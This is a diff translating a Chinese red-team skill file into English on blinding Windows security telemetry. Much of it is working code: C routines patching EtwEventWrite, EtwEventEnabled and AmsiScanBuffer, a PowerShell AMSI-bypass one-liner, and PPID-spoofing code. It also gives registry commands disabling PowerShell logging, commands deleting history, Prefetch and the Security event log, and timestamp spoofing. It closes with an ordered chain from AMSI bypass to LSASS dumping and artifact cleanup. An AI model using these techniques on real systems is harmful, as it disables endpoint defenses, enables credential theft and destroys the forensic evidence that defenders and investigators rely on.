@@ -1,66 +1,66 @@
-# 遥测致盲：ETW / AMSI / 反取证
+# Telemetry blinding: ETW / AMSI / anti-forensics
 
-> 仅限授权红队 / 对抗演练 / 自有产品测试，禁止用于未授权目标。
+> Use only for authorized red teams, adversary simulations, and owned-product testing. Do not use against unauthorized targets.
 
-EDR 的检测能力很大程度依赖 ETW（Event Tracing for Windows）与 AMSI（Antimalware Scan Interface）这两条遥测管道。
-本文档汇总针对这两条管道的红队对策，并补充 Sysmon / PowerShell logging / 时间戳 spoof 等反取证组合。
+EDR detection depends heavily on ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface), two telemetry channels built into Windows.
+This document summarizes red-team countermeasures for both channels and adds anti-forensics methods for Sysmon, PowerShell logging, and timestamps.
 
-对照 MITRE ATT&CK：T1562.001 / T1562.002 / T1562.006 / T1070 / T1027。
+Map to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.
 
-## 1. ETW 内部结构
+## 1. ETW internals
 
-ETW 是 Windows 内置的高性能事件追踪框架，EDR 用它做"轻量内核遥测"。
-红队最关心的 provider：
+ETW is a high-performance event-tracing framework built into Windows. EDR uses it as lightweight kernel telemetry.
+Red teams should focus on these providers:
 
-| Provider GUID | 名称 | 谁在用 |
-|--------------|------|--------|
-| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender、MDE、第三方 EDR |
-| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI 上报 |
-| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | 进程 / 线程基础事件 |
-| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET 加载、JIT |
-| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR 启动 |
+| Provider GUID | Name | Used by |
+|---------------|------|---------|
+| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDR |
+| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
+| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Basic process / thread events |
+| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading and JIT |
+| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |
 
-### 关键用户态 API
+### Key user-mode APIs
 
-| API | DLL | 作用 |
-|-----|-----|------|
-| `EtwEventWrite` | `ntdll.dll` | 写事件（最常用） |
-| `EtwEventWriteFull` | `ntdll.dll` | 带 activity ID 的事件 |
-| `EtwEventWriteEx` | `ntdll.dll` | 扩展版本 |
-| `NtTraceEvent` | `ntdll.dll` | EtwEventWrite 底层 |
-| `NtTraceControl` | `ntdll.dll` | 控制 trace session（启/停/查询 provider） |
-| `EtwEventEnabled` | `ntdll.dll` | provider 是否启用 |
-| `EtwEventRegister` | `ntdll.dll` | 注册 provider |
+| API | DLL | Function |
+|-----|-----|----------|
+| `EtwEventWrite` | `ntdll.dll` | Write an event (most common) |
+| `EtwEventWriteFull` | `ntdll.dll` | Event with activity ID |
+| `EtwEventWriteEx` | `ntdll.dll` | Extended version |
+| `NtTraceEvent` | `ntdll.dll` | Lower layer for EtwEventWrite |
+| `NtTraceControl` | `ntdll.dll` | Control a trace session (start, stop, query provider) |
+| `EtwEventEnabled` | `ntdll.dll` | Check whether a provider is enabled |
+| `EtwEventRegister` | `ntdll.dll` | Register a provider |
 
-### 调用链
+### Call chain
 
 ```text
-应用代码 EventWrite(...)
-  → 微软封装 (TraceLogging API)
+Application code EventWrite(...)
+  → Microsoft wrapper (TraceLogging API)
   → ntdll!EtwEventWrite[Full|Ex]
   → ntdll!NtTraceEvent (syscall)
-  → nt!NtTraceEvent (内核)
-  → 内核 ETW core → 消费端（EDR 用户态进程订阅 session）
+  → nt!NtTraceEvent (kernel)
+  → Kernel ETW core → consumer (EDR user-mode process subscribes to the session)
 ```
 
-## 2. ETW Patch 三种方法
+## 2. Three ETW patch methods
 
-### 方法 A：EtwEventWrite head patch
+### Method A: EtwEventWrite head patch
 
-直接把 `ntdll!EtwEventWrite` 入口改成立即返回成功：
+Change the `ntdll!EtwEventWrite` entry to return success immediately:
 
 ```text
-原始：
+Original:
   4C 8B DC                 mov r11, rsp
   48 81 EC 88 00 00 00     sub rsp, 88h
   ...
 
-patch 后（x64）：
+After patch (x64):
   33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
   C3                       ret
 ```
 
-C 代码：
+C code:
 
 ```c
 #include <windows.h>
@@ -75,7 +75,7 @@ BOOL PatchEtwEventWrite(void) {
     BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
     DWORD oldProt = 0;
 
-    // 注意：VirtualProtect 自身可能被 hook -> 用 indirect syscall 版本
+    // Warning: VirtualProtect itself may be hooked. Use the indirect syscall version.
     if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
         return FALSE;
 
@@ -86,56 +86,56 @@ BOOL PatchEtwEventWrite(void) {
 }
 ```
 
-**OPSEC 警告**：写 ntdll 内存本身是 ETW-TI 监控的 `ALPC_MODIFY_PROCESS` / `PROTECTVM` 事件源。
-必须 **先用 indirect syscall + 绕过 NtProtectVirtualMemory hook 后再 patch**，
-否则 patch 还没生效 EDR 就已经收到告警。
+**OPSEC warning**: Writing ntdll memory itself creates ETW-TI `ALPC_MODIFY_PROCESS` / `PROTECTVM` events.
+Use **indirect syscall + bypass the `NtProtectVirtualMemory` hook before patching**.
+Otherwise, EDR receives the alert before the patch takes effect.
 
-### 方法 B：EtwEventEnabled always-false
+### Method B: EtwEventEnabled always false
 
-更隐蔽：不修改 `EtwEventWrite`，而是让 `EtwEventEnabled` 永远返回 FALSE，
-应用层会自己判断 "provider 没开" → 不调用 `EtwEventWrite`，对内存 hash 完整性检查更友好（很多 EDR 校验 `EtwEventWrite` 字节）。
+More covert: Do not modify `EtwEventWrite`. Make `EtwEventEnabled` always return FALSE.
+The application then sees that the provider is disabled and does not call `EtwEventWrite`. This is friendlier to memory-hash integrity checks because many EDR products check `EtwEventWrite` bytes.
 
 ```c
-// EtwEventEnabled 通常返回 BOOLEAN (1 byte)
+// EtwEventEnabled usually returns BOOLEAN (1 byte)
 BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
 ```
 
-### 方法 C：NtTraceControl 关 provider
+### Method C: Disable the provider with `NtTraceControl`
 
-用 syscall 直接关闭 EDR session（侵入式，但是不动 ntdll 字节）：
+Use a syscall to close the EDR session directly. This is intrusive but does not modify ntdll bytes:
 
 ```c
 // NtTraceControl(EtwpStopTrace, ...)
-// 需要 SeSystemProfilePrivilege 或更高
-// 适用于 Local Admin + UAC bypass 后
+// Requires SeSystemProfilePrivilege or higher.
+// Use after Local Admin + UAC bypass.
 ```
 
-实战中较少用，因为：
+Use this less often because:
 
-- 关 session 本身会触发"ETW provider stopped"事件被另一条管道感知
-- 需要高权限
+- Closing the session itself triggers an "ETW provider stopped" event that another channel can detect.
+- It requires high privileges.
 
-### 方法 D：内核态 ETW patch（仅在已有 BYOVD/内核读写时）
+### Method D: Kernel ETW patch (only with existing BYOVD or kernel read/write)
 
 ```text
 nt!EtwpEventTracingProviderEnableInfo
 nt!EtwThreatIntProvRegHandle
-直接置 0 让所有 ETW-TI 事件被丢弃
+directly set to 0 so all ETW-TI events are discarded
 ```
 
-属于 attack-chain 的 BYOVD 阶段，本 skill 不深入。
+This belongs to the BYOVD phase of `attack-chain`. This Skill does not cover it in depth.
 
-## 3. AMSI Bypass
+## 3. AMSI bypass
 
-AMSI 是 Windows 提供给 PowerShell / .NET / WMI / VBA 在执行脚本前做反病毒扫描的接口。
-红队最常碰到的是 PowerShell + AMSI。
+AMSI is a Windows interface that scans scripts for viruses before PowerShell, .NET, WMI, or VBA executes them.
+Red teams most often encounter PowerShell + AMSI.
 
-### 经典 AmsiScanBuffer Patch
+### Classic AmsiScanBuffer patch
 
 ```c
-// amsi.dll!AmsiScanBuffer 入口写：
+// Write at the amsi.dll!AmsiScanBuffer entry:
 //   mov eax, 0x80070057     ; E_INVALIDARG
-//   ret 4                    ; (32位) 或 ret (64位)
+//   ret 4                    ; (32-bit) or ret (64-bit)
 
 BOOL PatchAmsi(void) {
     HMODULE h = LoadLibraryA("amsi.dll");
@@ -155,44 +155,44 @@ BOOL PatchAmsi(void) {
 }
 ```
 
-PowerShell 一句话版本（仅参考检测对抗，本身被签名 / Defender 拦截）：
+PowerShell one-line version (for detection research only; signatures and Defender block it):
 
 ```powershell
-# 概念演示——真实环境必须配合混淆 / HWBP
+# Concept demonstration. A real environment requires obfuscation / HWBP.
 [Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
 ```
 
-### 进阶方案 1：Hardware Breakpoint AMSI Bypass
+### Advanced method 1: Hardware breakpoint AMSI bypass
 
-不动 amsi.dll 内存（不会触发完整性扫描）：
+Do not modify amsi.dll memory, so integrity scanning does not trigger:
 
 1. AddVectoredExceptionHandler
-2. 在 `AmsiScanBuffer` 入口设 `DR0`
-3. VEH 命中时设置 `RAX = 0x80070057`、`RIP = ret 指令地址`、`RSP += 8`
-4. ContinueExecution
+2. Set `DR0` at the `AmsiScanBuffer` entry.
+3. On a VEH hit, set `RAX = 0x80070057`, `RIP = ret instruction address`, and `RSP += 8`.
+4. ContinueExecution.
 
-与 unhook-techniques.md 的 HWBP Blindside 同一套基础设施，可以共用 VEH。
+Use the same infrastructure as the HWBP Blindside in unhook-techniques.md. Share the VEH.
 
-### 进阶方案 2：AmsiContext / AmsiSession 损坏
+### Advanced method 2: Corrupt `AmsiContext` / `AmsiSession`
 
-构造畸形 `AmsiContext` 结构，让 `AmsiScanBuffer` 内部因为校验失败提前返回 success：
+Build a malformed `AmsiContext` structure. Make `AmsiScanBuffer` return success early after validation fails:
 
 ```text
-// AmsiContext 头部应该是 "AMSI" 魔数
-// 改成 "XXXX" → AmsiScanBuffer 内部校验失败但返回 S_OK + AMSI_RESULT_CLEAN
+// The AmsiContext header should contain the "AMSI" magic value.
+// Change it to "XXXX" → AmsiScanBuffer validation fails but returns S_OK + AMSI_RESULT_CLEAN.
 ```
 
-### 进阶方案 3：Reflective 加载副本 amsi.dll
+### Advanced method 3: Reflectively load a copy of amsi.dll
 
-不用系统 amsi.dll，把一份干净副本反射加载到自己进程，并重定向 PowerShell 引擎对 AMSI 的调用。
-适用于已经在加载阶段拦截 PowerShell.exe 启动的高级 EDR。
+Do not use the system amsi.dll. Reflectively load a clean copy into the process and redirect PowerShell engine calls to AMSI.
+Use this when an advanced EDR already intercepts PowerShell.exe startup during loading.
 
-## 4. 反取证：清除痕迹
+## 4. Anti-forensics: clear artifacts
 
-### PowerShell ScriptBlock Logging 关闭
+### Disable PowerShell ScriptBlock Logging
 
 ```powershell
-# 注册表（需管理员）
+# Registry (requires administrator)
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
     -Name 'EnableScriptBlockLogging' -Value 0 -Force
 
@@ -202,40 +202,40 @@ Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Mod
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
     -Name 'EnableTranscripting' -Value 0 -Force
 
-# Group Policy 路径：
+# Group Policy path:
 # Computer Configuration → Administrative Templates → Windows Components →
 #   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
 ```
 
-### 清 PowerShell history
+### Clear PowerShell history
 
 ```powershell
-# 当前会话
+# Current session
 Clear-History
-# 持久化 history (PSReadLine)
+# Persistent history (PSReadLine)
 Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
 ```
 
-### 清 Prefetch
+### Clear Prefetch
 
 ```powershell
-# 需要 SYSTEM
+# Requires SYSTEM
 Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
-# 整体清空（动作大，慎用）
+# Clear all entries (large action, use carefully)
 # Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
 ```
 
-### 清 ETL log
+### Clear ETL logs
 
 ```powershell
-# 停 session 后删 etl
+# Stop the session, then delete the ETL
 logman stop "EventLog-Security" -ets
 Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
-# 注意：直接删 .evtx 会被 Event Log Service 重新创建并写入 "log cleared" 事件 (Event ID 1102)
-# 更隐蔽：内存中 patch wevtsvc.dll 的 EventLog API（属于 T1070.001）
+# Warning: Directly deleting .evtx makes Event Log Service recreate it and write a "log cleared" event (Event ID 1102).
+# More covert: Patch the EventLog API in wevtsvc.dll in memory (T1070.001).
 ```
 
-### 时间戳 spoof (T1070.006)
+### Timestamp spoofing (T1070.006)
 
 ```powershell
 $f = 'C:\Windows\Temp\implant.dll'
@@ -245,26 +245,26 @@ $ref = 'C:\Windows\System32\notepad.exe'
 (Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
 ```
 
-## 5. Sysmon 监控规避
+## 5. Evade Sysmon monitoring
 
-Sysmon 是社区最常见的免费遥测（很多企业用 olaf 配置）。
-关键事件：
+Sysmon is the most common free community telemetry tool. Many enterprises use the olaf configuration.
+Key events:
 
-| Event ID | 含义 |
-|----------|------|
-| 1 | ProcessCreate（含 PPID、CommandLine、Hash） |
-| 7 | ImageLoad（DLL 加载） |
+| Event ID | Meaning |
+|----------|---------|
+| 1 | ProcessCreate (including PPID, CommandLine, Hash) |
+| 7 | ImageLoad (DLL load) |
 | 8 | CreateRemoteThread |
-| 10 | ProcessAccess（OpenProcess） |
+| 10 | ProcessAccess (OpenProcess) |
 | 11 | FileCreate |
-| 12/13/14 | 注册表 |
+| 12/13/14 | Registry |
 | 22 | DNS Query |
-| 25 | ProcessTampering（image hollowing） |
+| 25 | ProcessTampering (image hollowing) |
 
-### 规避思路
+### Evasion methods
 
-1. **不创建新进程** — 全部在已注入进程内行动，避开 Event ID 1
-2. **PPID Spoof** — 用 `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` 把 PPID 设为 `explorer.exe`，让 Sysmon ProcessCreate 看着合法
+1. **Do not create a new process**: Operate inside an existing injected process and avoid Event ID 1.
+2. **PPID spoof**: Use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set PPID to `explorer.exe`, so Sysmon ProcessCreate looks legitimate.
 
 ```c
 STARTUPINFOEX si = {0};
@@ -283,64 +283,64 @@ CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
     EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
 ```
 
-3. **Unbacked memory + 不动镜像** — Process Hollowing 在新版 Sysmon 已经被 Event ID 25 捕获。
-   首选用 **module stomping**（覆盖已加载合法 DLL 的某节区）或 **dirty vanity** 等较新技术，
-   配合 PPID spoof
-4. **不要远程线程** — 避免 Event ID 8；用 `NtCreateThreadEx` 在自己进程内执行 / APC / Early Bird APC
-5. **DNS 走 DoH / HTTPS** — 避免 Event ID 22
+3. **Unbacked memory + do not modify the image**: New Sysmon versions capture Process Hollowing with Event ID 25.
+   Prefer **module stomping** (overwrite a section of a loaded legitimate DLL) or newer methods such as **dirty vanity**.
+   Use PPID spoofing with either technique.
+4. **Do not use a remote thread**: Avoid Event ID 8. Use `NtCreateThreadEx` in your own process, APC, or Early Bird APC.
+5. **Use DoH / HTTPS for DNS**: Avoid Event ID 22.
 
-## 6. Call Stack Spoof + 时间戳让事件像合法软件
+## 6. Call stack spoofing and timestamps make events look legitimate
 
-即使 ProcessCreate 没办法不触发（比如某些场景必须 spawn child），可以：
+When ProcessCreate cannot be avoided, such as when a child process must be spawned, you can:
 
-- 把 CommandLine 改成与某个合法软件相似的格式
-- PPID spoof 到 services.exe（伪装 SCM 启动的服务）
-- 修改 ImageLoad 看到的 Image hash：通过 module stomping 把 implant 代码放进一个签名 DLL 内存空间
-- 配合 CallStackSpoofer：Sysmon 即使开了 EnableCallTracing 也看不到 implant 帧
+- Change CommandLine to resemble a legitimate program.
+- Spoof PPID to services.exe and appear as an SCM-started service.
+- Change the ImageLoad image hash by using module stomping to place implant code in a signed DLL memory space.
+- Use CallStackSpoofer. Sysmon cannot see implant frames even when EnableCallTracing is enabled.
 
-## 7. 实战 OPSEC：操作顺序
+## 7. Engagement OPSEC: operation order
 
-**顺序错了 EDR 会先收到告警**，导致后续动作直接被熔断。
+**The wrong order lets EDR receive an alert first** and cuts off later actions.
 
-正确顺序：
+Correct order:
 
 ```text
-1. AMSI bypass (HWBP 优先，避免写 amsi.dll)
-   ─── 让 .NET / PowerShell 装载 implant 时不被扫
-2. ETW patch (先 patch EtwEventWrite，再做任何 syscall)
-   ─── 关掉自身后续动作的遥测
-3. NtProtectVirtualMemory 用 indirect syscall 调用
-   ─── 准备好"安全的"内存权限切换通道
-4. Unhook ntdll (Peruns Fart) 或 enable indirect syscall
-   ─── 抹掉用户态 hook
-5. Call stack spoof setup
-   ─── 准备好之后所有 syscall 的伪栈
-6. 实际 payload 执行 (注入 / 横向 / dump LSASS)
-7. 清痕迹 (PowerShell history / Prefetch / 时间戳)
+1. AMSI bypass (prefer HWBP to avoid writing amsi.dll)
+   ─── Prevent scanning while .NET / PowerShell loads the implant.
+2. ETW patch (patch EtwEventWrite before any syscall)
+   ─── Disable telemetry for later actions.
+3. Call NtProtectVirtualMemory through an indirect syscall.
+   ─── Prepare a safe memory-permission change channel.
+4. Unhook ntdll (Peruns Fart) or enable indirect syscall.
+   ─── Remove user-mode hooks.
+5. Set up call stack spoofing.
+   ─── Prepare a forged stack for all later syscalls.
+6. Execute the payload (injection / lateral movement / dump LSASS).
+7. Clear artifacts (PowerShell history / Prefetch / timestamps).
 ```
 
-错误顺序示例：
+Wrong order examples:
 
 ```text
-❌ 先 unhook ntdll → ETW-TI 立即上报 PROTECTVM + module modification → SOC 已经收到告警
-❌ 先 dump LSASS → AMSI / ETW 都还没压 → 高置信 T1003.001 告警
+❌ Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → SOC receives the alert.
+❌ Dump LSASS first → AMSI / ETW are not suppressed → high-confidence T1003.001 alert.
 ✅ AMSI → ETW → unhook → spoof → payload
 ```
 
-## 参考资料
+## References
 
-- ETW Threat Intelligence Provider：<https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
-- ETW Patching 综述：<https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
-- AMSI Bypass 大全：<https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
-- Sysmon olaf 配置：<https://github.com/olafhartong/sysmon-modular>
-- PPID Spoofing：<https://blog.didierstevens.com/2017/03/20/>
-- Ekko sleep mask：<https://github.com/Cracked5pider/Ekko>
-- Foliage sleep obfuscation：<https://github.com/SecIdiot/FOLIAGE>
-- MITRE T1562.002 (Disable Windows Event Logging)：<https://attack.mitre.org/techniques/T1562/002/>
-- MITRE T1562.006 (Indicator Blocking)：<https://attack.mitre.org/techniques/T1562/006/>
-- MITRE T1070 (Indicator Removal)：<https://attack.mitre.org/techniques/T1070/>
+- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
+- ETW patching overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
+- AMSI bypass collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
+- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
+- PPID spoofing: <https://blog.didierstevens.com/2017/03/20/>
+- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
+- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
+- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
+- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
+- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>
 
-## 路由回调
+## Routing callback
 
-完成本三件套（hook 调研 → unhook → telemetry 致盲）后，回到 `SKILL.md` Step 5 在 sandbox 验证，
-然后按 `attack-chain/` 的 initial access 与 lateral movement 章节进入下一阶段。
+After completing this three-part set (hook survey → unhook → telemetry blinding), return to Step 5 in `SKILL.md` and verify in the sandbox.
+Then use the `initial access` and `lateral movement` sections in `attack-chain/` for the next phase.
